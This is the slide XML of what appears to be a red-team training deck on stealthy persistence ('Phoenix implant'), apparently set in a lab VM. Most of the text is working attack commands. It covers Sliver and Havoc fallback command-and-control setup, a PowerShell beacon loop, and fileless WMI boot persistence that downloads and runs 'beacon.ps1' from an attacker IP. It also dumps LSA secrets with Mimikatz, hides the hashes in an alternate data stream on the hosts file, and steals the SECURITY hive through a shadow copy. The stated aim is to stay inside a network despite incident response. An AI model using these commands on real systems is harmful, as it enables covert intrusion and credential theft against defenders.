          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLst>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Different Windows builds have different SSNs. Ensure your syscall stubs use dynamically resolved SSNs (Hell's Gate) or are updated for each Windows version.</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="383979420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854B8-D1F3-4CEA-97C6-43DEAA35643D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" kern="100"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Task 04: Fortress Persistence – The "Phoenix" Implant</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" kern="100"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br>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E97B0D20-6106-4C15-A31C-EFB7FD8C0A9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="101600" y="1414144"/>
            <a:ext cx="12090400" cy="5443855"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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 Description: The Blue Team WILL eventually find and shut down your primary Sliver/Havoc listener, or the host will be rebuilt. You need a persistence mechanism that resurrects itself from the ashes without relying on your primary infrastructure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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 Technical Requirements:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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  · Resilient Callback: Deploy a secondary, encrypted DNS Beacon or ICMP Beacon (e.g., via a custom script) that only activates if it fails to reach the primary HTTPS C2 server after 5 retries.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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  · WMI Permanent Subscriptions: Create a WMI Event Filter that triggers your resurrection payload every time Windows starts (Event ID 1). Store the payload base64-encoded inside the WMI query itself—no files on disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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  · Stored Credentials: Dump all LSA secrets and store them locally in a hidden ADS (Alternate Data Stream) attached to a legitimate system file (e.g., C:\Windows\System32\drivers\etc\hosts:secret). If you lose domain access, you have offline hashes to re-enter.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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  · Installation Verification: Reboot the target VM (or trigger the event) and confirm the beacon re-establishes a connection without any manual intervention from you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100"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 Learning Goal: Master the "Fortress Mentality". A single C2 listener is fragile. A self-healing implant with multiple fallback mechanisms ensures you stay inside even during an active Blue Team incident response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8057741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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Task 04: Fortress Persistence – The "Phoenix" Implant</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1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Part 1: Resilient Callback – DNS/ICMP Fallback If you don’t have the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1"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dns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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you can try bore.pub</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1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What It Does</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Deploys a secondary encrypted DNS or ICMP beacon that activates only after 5 failed attempts to reach the primary HTTPS C2 server. This ensures your implant survives even if the primary listener is taken down.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Sliver Implementation</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1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1: Start a DNS Listener (Fallback)</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sliver &gt; </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dns</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--domains c2dns.your-backup-domain.com --</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lport</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53</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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2: Generate Implant with Multiple Callbacks</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sliver &gt; generate --http https://primary.domain.com:443 --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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dns</a:t>
            </a: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c2dns.your-backup-domain.com --format exe --save phoenix.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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3: Configure Beacon Retry Logic</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sliver &gt; beacon --interval 60 --jitter 30 --fallback 5</a:t>
            </a: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The implant will attempt HTTPS 5 times, then switch to DNS fallback.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1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Havoc Implementation</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1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1: Create a DNS Listener (Fallback)</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Havoc client → View → Listeners → Add</a:t>
            </a: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Protocol: DNS</a:t>
            </a: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Host: c2dns.your-backup-domain.com</a:t>
            </a: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Port: 53</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115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Save</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="353319296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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="32500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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2: Generate Implant with Multiple Callbacks</a:t>
            </a:r>
            <a:endPar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Havoc client → Attack → Payload → Generate</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Select primary HTTPS listener</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Add DNS listener as fallback</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Generate implant</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Custom Script Alternative (PowerShell)</a:t>
            </a:r>
            <a:endPar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If your C2 does not support multiple callbacks natively, use this PowerShell script:</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$primary = "https://primary.domain.com:443"</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$fallback = "https://backup.domain.com:443"</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$retries = 0</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maxRetries</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5</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while ($true) {</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try {</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$response = Invoke-</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WebRequest</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-Uri $primary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TimeoutSec</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10</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if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response.StatusCode</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-eq 200) {</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$retries = 0</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Process C2 commands</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catch {</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$retries++</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if ($retries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ge</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maxRetries</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Invoke-</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WebRequest</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-Uri $fallback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TimeoutSec</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10</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$retries = 0</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Start-Sleep -Seconds 60</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9164401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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="47500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Part 2: WMI Permanent Subscriptions (Fileless Persistence)</a:t>
            </a:r>
            <a:endPar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What It Does</a:t>
            </a:r>
            <a:endPar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Creates a WMI Event Filter that triggers your resurrection payload every time Windows starts. The payload is base64-encoded inside the WMI query itself, leaving no files on disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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1: Create WMI Event Filter (Triggers on Boot)</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "$filter =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wmiclass</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]'\\.\root\subscription:__</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EventFilter</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CreateInstance</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filter.QueryLanguage</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'WQL';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filter.Query</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'SELECT * FROM __</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InstanceModificationEvent</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WITHIN 60 WHERE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TargetInstance</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ISA ''Win32_PerfFormattedData_PerfOS_System'' AND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TargetInstance.SystemUpTime</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&gt; 60 AND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TargetInstance.SystemUpTime</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&lt; 120';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filter.Name</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PhoenixFilter</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filter.EventNamespace</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'root\cimv2'; $result =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filter.Put</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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2: Create WMI Event Consumer (Executes Payload)</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "$consumer =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wmiclass</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]'\\.\root\</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subscription:CommandLineEventConsumer</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CreateInstance</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consumer.Name</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PhoenixConsumer</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consumer.CommandLineTemplate</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powershell</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-c "Invoke-Expression (New-Object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Net.WebClient</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DownloadString</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(''http://YOUR_KALI_IP:8080/beacon.ps1'')"'; $result =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consumer.Put</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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3: Bind Filter and Consumer Together</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "$filter = Get-</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WmiObject</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-Class __</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EventFilter</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-Namespace root\subscription -Filter "Name='</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PhoenixFilter</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$consumer = Get-</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WmiObject</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-Class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CommandLineEventConsumer</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-Namespace root\subscription -Filter "Name='</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PhoenixConsumer</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$binding =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wmiclass</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]'\\.\root\subscription:__</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FilterToConsumerBinding</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CreateInstance</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binding.Filter</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$filter;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binding.Consumer</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$consumer; $result =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binding.Put</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p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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4: Encode Payload in WMI Query (No File on Disk)</a:t>
            </a:r>
            <a:endPar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Generate a base64-encoded PowerShell payload:</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echo "Invoke-Expression (New-Object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Net.WebClient</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DownloadString</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('http://YOUR_KALI_IP:8080/beacon.ps1')" | base64</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Modify the WMI query to include the encoded payload:</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execute -o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powershell</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-c "$filter = Get-</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WmiObject</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-Class __</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EventFilter</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-Namespace root\subscription -Filter "Name='</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PhoenixFilter</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filter.Query</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'SELECT * FROM __</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InstanceModificationEvent</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WITHIN 60 WHERE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TargetInstance</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ISA ''Win32_PerfFormattedData_PerfOS_System'' AND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TargetInstance.SystemUpTime</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&gt; 60 AND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TargetInstance.SystemUpTime</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&lt; 120';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filter.Put</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="382425149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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="55000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Part 3: Stored Credentials – LSA Secrets in ADS</a:t>
            </a:r>
            <a:endPar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What It Does</a:t>
            </a:r>
            <a:endPar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Dumps LSA secrets and stores them in an Alternate Data Stream (ADS) attached to a legitimate system file. This provides offline hashes to re-enter </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if domain access is lost.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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1: Dump LSA Secrets</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "Invoke-</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Mimikatz</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-Command 'token::elevate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lsadump</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::secrets exit'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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2: Store Hashes in ADS</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "echo 'YOUR_DUMPED_HASHES' &gt; C:\Windows\System32\drivers\etc\hosts:secret"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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3: Verify ADS Exists</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "Get-Item C:\Windows\System32\drivers\etc\hosts -Stream *"</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Output should show:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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PSPath</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Microsoft.PowerShell.Core</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FileSystem</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::C:\Windows\System32\drivers\etc\hosts</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Stream        : :secret</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Length        : &lt;</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number_of_bytes</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&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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4: Retrieve Hashes from ADS When Needed</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "Get-Content C:\Windows\System32\drivers\etc\hosts -Stream secret"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2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5: Alternative – Use Volume Shadow Copy (Stealthier)</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c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vssadmin</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create shadow /for=C:"</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execute -o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powershell</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-c "copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy#\Windows\System32\config\SECURITY C:\temp\security.hive"</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execute -o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powershell</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-c "Invoke-</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Mimikatz</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-Command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lsadump</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::secrets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security:C</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:\temp\</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security.hive</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exit'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="278573110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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="47500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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Part 4: Installation Verification</a:t>
            </a:r>
            <a:endPar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What It Does</a:t>
            </a:r>
            <a:endPar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Reboots the target VM or triggers the event and confirms the beacon re-establishes a connection without any manual intervention.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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1: Verify WMI Subscription Exists</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "Get-</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WmiObject</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-Class __</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EventFilter</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-Namespace root\subscription | Select-Object Name"</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You should see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PhoenixFilter</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in the output.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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2: Reboot Target VM</a:t>
            </a:r>
            <a:endPar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execute -o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powershell</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-c "Restart-Computer -Force"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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3: Wait for System to Restart</a:t>
            </a:r>
            <a:endPar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Wait 60-120 seconds for the WMI event to trigger.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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4: Verify Session Re-Establishes Automatically</a:t>
            </a:r>
            <a:endPar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In Sliver:</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sliver &gt; sessions</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In Havoc:</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Check the Sessions tab.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2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5: Test Fallback – Kill Primary Listener</a:t>
            </a:r>
            <a:endPar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In Sliver:</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sliver &gt; jobs</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sliver &gt; kill </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" kern="100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>-</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k JOB_ID</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Wait for 5 retries (beacon interval configured in Part 1).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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Step 6: Verify DNS Fallback Works</a:t>
            </a:r>
            <a:endPar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sliver &gt; sessions</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You should see a new session established via DNS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="122966057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40E760-CECA-A9FD-1320-8EC5442F6DEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
